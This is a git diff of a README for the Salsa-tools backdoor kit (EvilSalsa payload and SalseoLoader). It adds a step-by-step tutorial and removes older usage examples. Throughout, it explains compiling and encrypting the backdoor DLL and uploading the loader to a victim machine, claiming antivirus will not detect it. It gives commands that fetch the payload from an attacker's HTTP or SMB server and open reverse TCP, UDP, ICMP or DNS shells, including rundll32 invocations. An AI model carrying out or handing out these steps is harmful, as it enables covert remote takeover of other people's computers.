@@ -94,53 +94,164 @@ Encrypterassembly.exe <FILE> <PASSWORD> <OUTPUT>
 #### Bringing the Encrypted EvilSalsa to the table with SalseoLoader
 SalseoLoader is in charge of loading the encrypted payload. Can be both compiled as a library or as an executable. If it is run as an executable, the chosen arguments must be provided when the executable is run. If it is compiled as a library, the descriptor "main" must be exported. Arguments are added using environmental variables.
 
-Executable usage:
+# Tutorial
+
+## Compiling the binaries
+
+Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.
+
+
+Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).
+
+
+You can **select the architecture** inside Visual Studio in the **left "Build" Tab in "Platform Target"**.
+
+(If you can't find this options press in "**Project Tab**" and then in "**<Project-Name> Properties**")
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen1.png)
+
+Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen2.png)
+
+## Prepare the Backdoor
+
+First of all, you will need to encode the **EvilSalsa.dll**. To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**
+
+### Python
+```bash
+python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
+python EncrypterAssembly/encrypterassembly.py EvilSalsa.dll password evilsalsa.dll.txt
 ```
-SalseoLoader.exe <PASSWORD> <PAYLOAD PATH> <SHELL TYPE> <LHOST> <LPORT>
+
+### Windows
 ```
-Library usage on Powershell:
+EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
+EncrypterAssembly.exe EvilSalsa.dll password evilsalsa.dll.txt
 ```
-set $env:pass="password"
-set $env:payload="http://10.10.10.10/evil.txt"
-set $env:lhost="10.10.10.10"
-set $env:lport="1337"
-set $env:shell="reversetcp"
+
+Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader**.
+**Upload the SalseoLoader.exe binary to the machine. It shouldn't be detected by any AV...**
+
+## Execute the backdoor
+
+### Getting a TCP reverse shell (downloading encoded dll through HTTP)
+
+Remember to start a nc as the reverse shell listener, and a HTTP server to serve the encoded evilsalsa.
+
+`SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>`
+
+### Getting a UDP reverse shell (downloading encoded dll through SMB)
+
+Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).
+
+`SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>`
+
+### Getting a ICMP reverse shell (encoded dll already inside the victim)
+
+**This time you need a special tool in the client to receive the reverse shell. Download:  [https://github.com/inquisb/icmpsh]**
+
+**Disable ICMP Replies:**
+```sysctl -w net.ipv4.icmp_echo_ignore_all=1
+
+#You finish, you can enable it again running:
+sysctl -w net.ipv4.icmp_echo_ignore_all=0
+```
+
+**Execute the client:**
+
+`python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"`
+
+**Inside the victim, lets execute the salseo thing:**
+
+`SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>`
+
+
+## Compiling SalseoLoader as DLL exporting main function
+
+Open the SalseoLoader project using Visual Studio.
+
+## Add before the main function: \[DllExport\]
+
+Before the main function add this line: \[DllExport\]
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen3.png)
+
+### Install DllExport for this project
+
+**Tools --> NuGet Package Manager --> Manage NuGet Packages for Solution...**
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen4.png)
+
+**Search for DllExport package (using Browse tab), and press Install (and accept the popup)**
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen5.png)
+
+In your project folder have appeared the files: **DllExport.bat** and **DllExport_Configure.bat**
+
+### Uninstall DllExport
+
+Press **Uninstall** (yeah, its weird but trust me, it is necessary)
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen6.png)
+
+### Exit Visual Studio and execute DllExport_configure
+
+Just **exit** Visual Studio
+
+Then, go to your **SalseoLoader folder** and **execute DllExport_Configure.bat**
+Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen7.png)
+
+### Open the project again with visual Studio
+**\[DllExport\]** should not be longer marked as error
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen8.png)
+
+### Build the solution
+Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen9.png)
+
+Select **x64 platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)
+
+![](https://github.com/carlospolop-forks/Salsa-tools/blob/master/images/imagen10.png)
+
+To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)
+
+### Test the generated Dll
+
+Copy and paste the Dll where you want to test it.
+
+Execute:
+
+`rundll32.exe SalseoLoader.dll,main`
+
+If not error appears, probably you have a functional dll!!
+
+## Get a shell using the Dll
+
+Don't forget to use a **HTTP server and set a nc listener**
+
+### Powershell
+
+```
+$env:pass="password"
+$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
+$env:lhost="10.2.0.5"
+$env:lport="1337"
+$env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
 
-Library usage on CMD:
+### CMD
+
 ```
-set pass="password"
-set payload="http://10.10.10.10/evil.txt"
-set lhost="10.10.10.10"
-set lport="1337"
-set shell="reversetcp"
+set pass=password
+set payload=http://10.2.0.5/evilsalsax64.dll.txt
+set lhost=10.2.0.5
+set lport=1337
+set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
-
-## Examples
-### SalseoLoader (executable version) running Encrypted EvilSalsa (UDP mode) from a web server:
-```
-SalseoLoader.exe hc0n-2019 http://192.168.1.235/elmal.txt reverseudp 192.168.1.235 1337
-```
-![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example1.png)
-
-### SalseoLoader (executable version) running Encrypted EvilSalsa (TCP mode) locally:
-```
-SalseoLoader.exe hc0n-2019 C:\elmal.txt reversetcp 192.168.1.235 1337
-```
-![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example2.png)
-## SalseoLoader (executable version) running Encrypted EvilSalsa (ICMP mode) from SMB:
-```
-SalseoLoader.exe hc0n-2019 \\192.168.1.235\evil\elmal.txt reverseicmp 192.168.1.235 
-```
-![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example3.png)
-
-## SalseoLoader (executable version) running Encrypted EvilSalsa (DNS mode) locally:
-## Example ReverseDNS
-```
-SalseoLoader.exe hc0n-2019 C:\elmal.txt reversedns 192.168.1.235 licordebellota.org
-```
-![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example4.png)
-
-
